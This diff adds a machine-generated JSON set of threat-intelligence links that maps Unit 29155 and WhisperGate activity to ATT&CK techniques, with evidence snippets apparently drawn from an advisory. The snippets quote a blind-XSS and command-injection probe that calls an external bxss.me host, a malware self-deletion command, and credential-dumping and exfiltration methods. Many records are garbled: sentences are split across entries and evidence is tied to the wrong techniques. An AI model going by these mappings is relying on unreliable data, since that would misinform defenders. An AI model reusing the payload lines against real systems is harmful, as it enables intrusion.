+   "target": "T1590.002",
+   "evidence": " Amass: Unit 29155 cyber actors leveraged both Amass and VirusTotal to obtain subdomains for"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1596.005",
+   "evidence": "target websites [T1590.002].[7]"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1595.002",
+   "evidence": " Droopescan[8]"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1595.002",
+   "evidence": " JoomScan[9]"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1046",
+   "evidence": " MASSCAN: Unit 29155 cyber actors used MASSCAN and Nmap to discover other machines once"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1046",
+   "evidence": "inside victim networks.[10]"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1572",
+   "evidence": " Netcat[11]"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1595",
+   "evidence": " Nmap: Once Unit 29155 cyber actors gained access to victim internal networks, they further used"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1046",
+   "evidence": "Nmap (via the Nmap Scripting Engine [NSE]) to write custom scripts for discovering and scanning"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1596.005",
+   "evidence": "other machines [T1046]."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1596.005",
+   "evidence": " Shodan: Unit 29155 cyber actors used Shodan to identify hosts with a specific set of vulnerabilities"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1596.005",
+   "evidence": "or device types [T1596.005].[12]"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1588.005",
+   "evidence": " VirusTotal[13]"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1588.005",
+   "evidence": " WPScan"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1572",
+   "evidence": "Additionally, Unit 29155 cyber actors have used infrastructure configured with OpenVPN configuration"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1572",
+   "evidence": "[T1572] over port 1194, and in some instances, to perform Active Directory (AD) enumeration. Adminer in"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1572",
+   "evidence": "combination with Impacket and ldapdomaindump were tools used for gathering information on AD. Once"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1572",
+   "evidence": "active devices are found, Unit 29155 cyber actors look for vulnerabilities to exploit. For example, the"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1588.005",
+   "evidence": "Acunetix vulnerability scanning tool has been used for gathering information on potential vulnerabilities"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1588.005",
+   "evidence": "such as blind cross-site scripting, as shown in the following commands:"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1588.005",
+   "evidence": "GET /index.php?log=to@example.com>%0d%0abcc:009247.3183-"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1588.005",
+   "evidence": "377.3183.1bf6c.19446.2@bxss.me"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1588.005",
+   "evidence": "\"GET /CMS/files/log.htm HTTP/1.1\" * * \"(nslookup hitccruvbrumn76c1b.bxss.me||perl"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1588.005",
+   "evidence": "-e \\\"gethostbyname('hitccruvbrumn76c1b.bxss.me')\\\")\""
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1588.005",
+   "evidence": "As the cyber actors perform reconnaissance on victim networks and discover vulnerabilities within victim"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1588.005",
+   "evidence": "web servers or machines, they obtain CVE exploit scripts from GitHub repositories and use them against"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1588.005",
+   "evidence": "victim infrastructure [T1588.005]. Unit 29155 cyber actors have been observed obtaining the respective"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1588.005",
+   "evidence": "exploit scripts for, but not exploiting, the following CVEs:"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "WhisperGate",
+   "evidence": "Unit 29155 cyber actors"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1567.002",
+   "evidence": "exfiltrated data to mega[.]nz using Rclone [T1567.002]."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1550.002",
+   "evidence": "used a Pass-the-Hash [T1550.002] via ProxyChains."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1059.007",
+   "evidence": "embedded bash commands"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "WhisperGate",
+   "evidence": "shortly following a deployment of WhisperGate malware, Unit 29155 cyber actors"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "Exfiltration Over Alternative Protocol",
+   "evidence": "exfiltrated data to mega[.]nz using Rclone [T1567.002]."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "Command and Scripting Interpreter: Windows Command Shell",
+   "evidence": "Cyber actors performed SSH and SSHPass executions."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "Exfiltration Over Web Service",
+   "evidence": "obtaining NT hashes via Server Message Block (SMB) using smbclient, executing Windows Management Instrumentation (WMI) with hashes, and making web requests with resources i.php and tunnel.jsp."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "Exfiltration Over Alternative Protocol",
+   "evidence": "cyber actors used smbclient via ProxyChains to access internal network shares, and subsequently PSQL and MySQL clients to access internal databases."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "Exfiltration Over Web Service",
+   "evidence": "cyber actors used Impacket for post-exploitation and lateral movement. The script secretsdump.py was used from the Impacket framework to obtain domain credentials, while psexec.py was subsequently used to move laterally within a victim network."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "Exfiltration Over Alternative Protocol",
+   "evidence": "cyber actors used ntlmrelayx.py via Impacket and krbrelayx.py, which requires Impacket to function."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "Exfiltration Over Web Service",
+   "evidence": "cyber actors used Responder.py."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "Brute Force: Password Spraying",
+   "evidence": "cyber actors used su-bruteforce to brute force a selected user using the su command."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "Remote Services: Remote Desktop Protocol",
+   "evidence": "cyber actors used BloodHound, an open source AD reconnaissance tool that can reveal hidden relationships and identify attack paths within an AD environment."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "Command and Scripting Interpreter: Python",
+   "evidence": "cyber actors used CrackMapExec via ProxyChains with SMB protocol targeting internal victim IP addresses. This open source post-exploitation tool automates assessing the security of large AD networks."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "System Services: Linux Privilege Escalation",
+   "evidence": "cyber actors used LinPEAS, an open source script designed to automate the process of searching for potential privilege escalation vulnerabilities on a Linux victim."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "Exfiltration Over Alternative Protocol",
+   "evidence": "cyber actors used GO Simple Tunnel (GOST) (MD5: 896e0f54fc67d72d94b40d7885f10c51) for 30 days within one incident and against additional victims on various occasions. GOST is a tunneling tool designed to establish secure connections between clients and servers, allowing for secure data transmission over untrusted networks."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "Exploit Public-Facing Application",
+   "evidence": "Cyber actors initiated Nmap scans on localized web servers."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "Exfiltration Over Web Service",
+   "evidence": "cyber actors performed lateral movement from compromised web servers to exploit a corporate Microsoft Windows network, commonly using psexec.py from the Impacket framework. The script secretsdump.py from the Impacket framework was used to obtain domain credentials."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "Access Broker",
+   "evidence": "cyber actors may have used Raspberry Robin malware in the role of an access broker [T1588.001]."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1583.003",
+   "evidence": "Since at least 2020, Unit 29155 cyber actors have used virtual private servers (VPSs) [T1583.003] to host"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1095",
+   "evidence": "initiate communication with the threat actors’ infrastructure [T1095]. In one instance, an established"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1059.001",
+   "evidence": "Use of the Metasploit Framework to search for and/or access modules such as mysql, postgres,"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1505.003",
+   "evidence": "Use of PHP (exp_door v1.0.2, b374k, WSO 4.0.5) and the P.A.S. web shells [T1505.003], likely"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1211",
+   "evidence": "Use of EternalBlue.[16],[17]"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1071.004",
+   "evidence": "Using Domain Name System (DNS) tunneling tools, such as dnscat/2 and Iodine, to tunnel IPv4"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1090.003",
+   "evidence": "ProxyChains—a tool used to route internal traffic through a series of proxies [T1090.003]—has been used to provide further anonymity and modify system configuration to force"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1090.003",
+   "evidence": "Unit 29155 cyber actors executed commands via ProxyChains—a tool used to route internal traffic through a series of proxies."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1071.001",
+   "evidence": "Unit 29155 cyber actors use POST requests over HTTP to send payloads to victims."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1071.004",
+   "evidence": "Unit 29155 cyber actors used DNS tunneling tools, such as dnscat/2 and Iodine, to tunnel IPv4 network traffic."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1095",
+   "evidence": "Unit 29155 cyber actors commonly use a reverse TCP connection to initiate communication with their infrastructure."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1105",
+   "evidence": "When an exploit is successfully executed on a victim system, Unit 29155 cyber actors are known to launch the Meterpreter payload to initiate communication with their actor-controlled systems."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1572",
+   "evidence": "Unit 29155 cyber actors have used infrastructure configured with OpenVPN configuration to tunnel traffic over a single port (1194), VPNs, and GOST to anonymize their operational activity."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1567.002",
+   "evidence": "Unit 29155 cyber actors exfiltrated data to the cloud storage and file hosting service, MEGA (mega.nz), using Rclone."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1485",
+   "evidence": "Unit 29155 cyber actors’ objectives include the destruction of data."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "WhisperGate",
+   "evidence": "Unit 29155 cyber actors’ use of WhisperGate involved the deployment of the malware files, stage1.exe"
+  },
+  {
+   "source": "Waqybg",
+   "type": "uses",
+   "target": "T1083",
+   "evidence": "ping arbitrarily and delete itself: cmd.exe /min /C ping 111.111.111.111 -n 5 -w 10 > Nul &"
+  },
+  {
+   "source": "Waqybg",
+   "type": "uses",
+   "target": "T1486",
+   "evidence": "Waqybg is known as WhisperKill—a malware downloaded by WhisperGate that destroys"
+  },
+  {
+   "source": "stage2.exe",
+   "type": "uses",
+   "target": "T1083",
+   "evidence": "ping arbitrarily and delete itself: cmd.exe /min /C ping 111.111.111.111 -n 5 -w 10 > Nul &"
+  },
+  {
+   "source": "stage2.exe",
+   "type": "uses",
+   "target": "T1486",
+   "evidence": "Waqybg is known as WhisperKill—a malware downloaded by WhisperGate that destroys"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "Data from Local Network",
+   "evidence": "data exfiltration site"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "Exploit Public-Facing Application",
+   "evidence": "Threat actors can exploit jump hosts, also known as jump servers or bastion hosts, to gain unauthorized access or perform malicious activities within a protected network."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "Command and Scripting Interpreter: Python",
+   "evidence": "https://nssm.cc"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "Command and Scripting Interpreter: Bash",
+   "evidence": "https://nssm.cc"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "Command and Scripting Interpreter: PowerShell",
+   "evidence": "https://nssm.cc"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "Command and Scripting Interpreter: Python",
+   "evidence": "https://3proxy.ru"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "Command and Scripting Interpreter: Bash",
+   "evidence": "https://3proxy.ru"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "Command and Scripting Interpreter: PowerShell",
+   "evidence": "https://3proxy.ru"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "Command and Scripting Interpreter: Python",
+   "evidence": "https://ngrok.com"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "Command and Scripting Interpreter: Bash",
+   "evidence": "https://ngrok.com"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "Command and Scripting Interpreter: PowerShell",
+   "evidence": "https://ngrok.com"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "Command and Scripting Interpreter: Python",
+   "evidence": "interlinks.top"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "Command and Scripting Interpreter: Bash",
+   "evidence": "interlinks.top"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "Command and Scripting Interpreter: PowerShell",
+   "evidence": "interlinks.top"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1588.001",
+   "evidence": "[T1588.001] like Raspberry Robin and SaintBot. While Unit 29155 cyber actors are best known for their"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1078.001",
+   "evidence": "scripts to authenticate to IP cameras with default usernames and passwords [T1078.001], and exfiltrating"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1125",
+   "evidence": "images [T1125] (JPG files). Attempts are then made to perform remote command execution via web to"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1552.001",
+   "evidence": "plaintext (as shown in Table 1 below) [T1552.001]."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1003",
+   "evidence": "[T1003]:"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1560",
+   "evidence": "In several instances, analysis identified Unit 29155 cyber actors compressing victim data [T1560] (e.g., the"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1003.001",
+   "evidence": "Subsystem Service (LSASS) memory dumps [T1003.001], Security Accounts Manager (SAM) files"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1003.002",
+   "evidence": "[T1003.002], and SECURITY and SYSTEM event log files [T1654]. As seen in victim incident response"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1654",
+   "evidence": "[T1003.002], and SECURITY and SYSTEM event log files [T1654]. As seen in victim incident response"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1114",
+   "evidence": "results, actor infrastructure has also been used to compromise multiple mail servers [T1114] and exfiltrate"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1213.001",
+   "evidence": "T1213.001 Unit 29155 cyber actors leveraged Through the Wire against the victim’s"
+  }
+ ],
+ "_meta": {
+  "engine": "0.4",
+  "model": "doc2stix-qwen3-8b:v2b",
+  "seconds": 2827.7,
+  "errors": "1 unparsable chunk(s)",
+  "replayed_from": "doc2stix-qwen3-8b-v2b-e0.3"
+ }
+}
